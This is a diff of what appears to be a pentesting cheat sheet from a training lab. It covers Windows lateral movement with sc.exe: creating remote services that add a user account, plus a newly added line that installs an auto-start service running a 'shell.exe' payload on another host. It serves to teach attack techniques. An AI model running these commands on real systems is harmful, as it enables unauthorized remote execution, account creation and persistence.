@@ -16,6 +16,7 @@ $credential = New-Object System.Management.Automation.PSCredential $username, $s
 ## sc
 ### Create a service
 * sc.exe \\TARGET create Myservice binPath= "net user munra Pass123 /add" start= auto
+* sc.exe \\otro.domain.com create SERVICIO_PERRON binPath= "%windir%\shell.exe" start= auto
 * sc.exe \\TARGET start Myservice
 * sc.exe \\TARGET stop THMservice
 * sc.exe \\TARGET delete THMservice
